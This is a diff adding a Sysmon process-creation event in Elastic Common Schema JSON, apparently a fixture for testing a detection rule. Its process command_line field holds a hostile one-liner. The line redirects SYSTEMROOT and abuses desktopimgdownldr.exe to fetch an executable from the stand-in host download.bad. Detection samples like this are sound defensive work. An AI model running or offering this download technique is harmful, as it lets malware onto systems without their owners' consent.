@@ -1,0 +1,135 @@
+{
+  "@timestamp": "2021-02-04T22:53:56.569Z",
+  "event": {
+    "category": [
+      "process"
+    ],
+    "type": [
+      "start",
+      "process_start"
+    ],
+    "kind": "event",
+    "code": 1,
+    "provider": "Microsoft-Windows-Sysmon",
+    "action": "Process Create (rule: ProcessCreate)",
+    "created": "2021-02-04T22:53:57.483Z",
+    "module": "sysmon"
+  },
+  "host": {
+    "hostname": "CLIENT3",
+    "architecture": "x86",
+    "os": {
+      "platform": "windows",
+      "version": "6.1",
+      "family": "windows",
+      "name": "Windows 7 Professional",
+      "kernel": "6.1.7601.18741 (win7sp1_gdr.150202-1526)",
+      "build": "7601.0"
+    },
+    "id": "19fc45ac-5890-4f96-81b1-50ed111c0ce4",
+    "ip": [
+      "192.168.56.103",
+      "172.16.1.3",
+      "fe80::5efe:c0a8:3867",
+      "fe80::5efe:ac10:103"
+    ],
+    "name": "CLIENT3.breach.local",
+    "mac": [
+      "00:50:56:00:03:03",
+      "00:50:56:00:00:03",
+      "00:00:00:00:00:00:00:e0",
+      "00:00:00:00:00:00:00:e0"
+    ]
+  },
+  "message": "Process Create:\nRuleName: \nUtcTime: 2021-02-04 22:53:56.569\nProcessGuid: {19FC45AC-7B04-601C-0000-00108DB50500}\nProcessId: 1048\nImage: C:\\Windows\\System32\\Defrag.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Disk Defragmenter Module\nProduct: Windows Disk Defragmenter\nCompany: Microsoft Corp.\nOriginalFileName: Defrag.EXE\nCommandLine: C:\\Windows\\system32\\defrag.exe -c\nCurrentDirectory: C:\\Windows\\system32\\\nUser: NT AUTHORITY\\SYSTEM\nLogonGuid: {19FC45AC-76E7-601C-0000-0020E7030000}\nLogonId: 0x3e7\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: MD5=9E759EDDE1E45A4E55752CD2ED321F89,SHA256=364C98DE9B220FC3D2E26A48296359C71DF1B3774EB9153E964F6486037C5B98\nParentProcessGuid: {19FC45AC-76E7-601C-0000-001081630000}\nParentProcessId: 440\nParentImage: C:\\Windows\\System32\\services.exe\nParentCommandLine: C:\\Windows\\system32\\services.exe",
+  "process": {
+    "pid": 1048,
+    "parent": {
+      "command_line": "C:\\Windows\\system32\\services.exe",
+      "name": "services.exe",
+      "args": [
+        "C:\\Windows\\system32\\services.exe"
+      ],
+      "entity_id": "{19FC45AC-76E7-601C-0000-001081630000}",
+      "pid": 440,
+      "executable": "C:\\Windows\\System32\\services.exe"
+    },
+    "name": "Defrag.exe",
+    "args": [
+      "C:\\Windows\\system32\\defrag.exe",
+      "-c"
+    ],
+    "hash": {
+      "md5": "9e759edde1e45a4e55752cd2ed321f89",
+      "sha256": "364c98de9b220fc3d2e26a48296359c71df1b3774eb9153e964f6486037c5b98"
+    },
+    "entity_id": "{19FC45AC-7B04-601C-0000-00108DB50500}",
+    "executable": "C:\\Windows\\System32\\Defrag.exe",
+    "command_line": "set \"SYSTEMROOT=C:\\Windows\\Temp\" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://download.bad/mal.exe /eventName:desktopimgdownldr",
+    "working_directory": "C:\\Windows\\system32\\"
+  },
+  "user": {
+    "name": "SYSTEM",
+    "domain": "NT AUTHORITY"
+  },
+  "related": {
+    "user": "SYSTEM",
+    "hash": [
+      "9e759edde1e45a4e55752cd2ed321f89",
+      "364c98de9b220fc3d2e26a48296359c71df1b3774eb9153e964f6486037c5b98"
+    ]
+  },
+  "agent": {
+    "hostname": "CLIENT3",
+    "ephemeral_id": "177650cc-629c-4abf-8b93-a90e2e515251",
+    "id": "c58de8d4-8be2-444c-bc20-92fab97cbaf5",
+    "name": "CLIENT3",
+    "type": "winlogbeat",
+    "version": "7.10.2"
+  },
+  "winlog": {
+    "provider_name": "Microsoft-Windows-Sysmon",
+    "event_id": 1,
+    "computer_name": "CLIENT3.breach.local",
+    "opcode": "Info",
+    "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+    "process": {
+      "pid": 1904,
+      "thread": {
+        "id": 308
+      }
+    },
+    "event_data": {
+      "LogonId": "0x3e7",
+      "TerminalSessionId": "0",
+      "FileVersion": "6.1.7600.16385 (win7_rtm.090713-1255)",
+      "LogonGuid": "{19FC45AC-76E7-601C-0000-0020E7030000}",
+      "Company": "Microsoft Corp.",
+      "OriginalFileName": "Defrag.EXE",
+      "Description": "Disk Defragmenter Module",
+      "Product": "Windows Disk Defragmenter",
+      "IntegrityLevel": "System"
+    },
+    "channel": "Microsoft-Windows-Sysmon/Operational",
+    "record_id": 1480,
+    "user": {
+      "domain": "NT AUTHORITY",
+      "type": "User",
+      "identifier": "S-1-5-18",
+      "name": "SYSTEM"
+    },
+    "task": "Process Create (rule: ProcessCreate)",
+    "api": "wineventlog",
+    "version": 5
+  },
+  "hash": {
+    "md5": "9e759edde1e45a4e55752cd2ed321f89",
+    "sha256": "364c98de9b220fc3d2e26a48296359c71df1b3774eb9153e964f6486037c5b98"
+  },
+  "ecs": {
+    "version": "1.5.0"
+  },
+  "log": {
+    "level": "information"
+  }
+}
